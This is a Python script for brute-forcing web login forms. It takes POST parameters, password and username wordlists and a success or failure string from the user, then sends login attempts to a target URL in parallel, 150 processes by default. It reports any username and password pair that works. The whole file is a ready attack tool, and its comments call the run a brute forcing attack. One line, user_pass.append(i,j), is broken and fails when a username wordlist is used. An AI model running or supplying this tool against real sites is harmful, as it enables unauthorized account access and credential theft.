import concurrent.futures
import requests
import threading
import time
import mmap
import re
from itertools import permutations

payload=input('''
Enter Post Data in the format :

user_parameter=user&password_parameter=pass&another_parameter=another_value&yet_another_parmater=yet_another_value...

where user is a value for username parameter, pass is a value for the password parameter, and another_value is another post parameter value, and so on.

Post Data : ''')
print()

data = dict(re.findall(r'(\w+)=(\w+)&?',payload))#use regex to convert post data to dictionary which requests module can use

user = [i for i in data.keys() if data[i]=='user'][0]#iterate over the data keys and find the parameter for user

password = [i for i in data.keys() if data[i]=='pass'][0]#iterate over the data keys and find the parameter for pass

session=requests.Session()#create a session object for sendind multiple requests with same session

set_threads=input("Enter number of processes to use for multi-processing (default : 150) : ")
print()

num_threads=150 if set_threads=='' else int(set_threads)#ternary operator to fall back to default value of 150 incase user doesn't enter a value for number of processes to use

file_name=input("Enter filename to use as password wordlist : ")
print()

fail_succ=input("Do you want to enter Failure String or Success String? (F/S) : ")
print()

if fail_succ=='F':
    fail_succ_string=input('Enter Failure String : ')
    print()

if fail_succ=='S':
    fail_succ_string=input('Enter Success String : ')
    print()

url=input("Enter url for the http post form page to brute force : ")
print()

choice=input("Do you want to use a wordlist for username? (y/n) : ")
print()

if choice.lower()=='y':
    username=input("Enter filename to use as user wordlist : ")
    print()

elif choice.lower()=='n':
    username=input("Enter username to use then  : ")
    print()

print("H4xx0ring........\n")

def send_request(user_pass):#function to actually send the post request for brute forcing the http form
    data[user]=user_pass[0]#update dictionary for post data with the user key
    data[password]=user_pass[1]#update dictionary for post data with the pass key
    response=session.post(url,data=data)#send post data to url
    return fail_succ_string in response.text,user_pass

def process_file(file_name,username):#function to process the wordlist files
    user_pass=[]
    passes=[]
    with open(file_name,'r') as f:#open wordlist file with passwords
        mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)#map the entire file into memory because ram is cheap and fast
        for line in iter(mm.readline,b""):#iterate through the contents of the file
            try:
                line=line.decode('utf-8')[:-1]#slice the line by removing the last character since it is a '\n'
            except:
                continue
            passes.append(line)

    if choice.lower()=='n':
        user_pass=[[username,i] for i in passes]#iterating and building a 2d list in the form [[user1,pass1],[user2,pass2]..]

    users=[]
    if choice.lower()=='y':
        with open(username,'r') as f:
            mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)#map the entire file into memory because ram is cheap and fast
            for line in iter(mm.readline,b""):#iterate through the contents of the file
                try:
                    line=line.decode('utf-8')[:-1]#slice the line by removing the last character since it is a '\n'
                except:
                    continue
                users.append(line)
        for i in users:
            for j in passes:
                user_pass.append(i,j)#iterating and building a 2d list, same as before

    send_request_parallel(user_pass)

def send_request_parallel(user_pass):#function which maps the previous basic functions to multiple processes
    final=''
    with concurrent.futures.ProcessPoolExecutor(num_threads) as executor:#Process Pool Executor uses Multi-Processing
        for i in executor.map(send_request,user_pass):#map the user_pass list to the send_request function then iterate through it to print outputs
            print(i)
            if not(i[0]) and fail_succ=='F':
                final=i
                break
            elif i[0] and fail_succ=='S':
                final=i
                break
    if final=="":
        print("\nNot Found :(")
    elif final[0] and fail_succ=='S':
        print("\nFound User:Pass = ",final[1])
    elif not(final[0]) and fail_succ=='F':
        print("\nFound User:Pass =  ",final[1])

start=time.time()
process_file(file_name,username)
end=time.time()
print('\nTime Elapsed :',end-start,'seconds')#measure time taken to complete the brute forcing attack


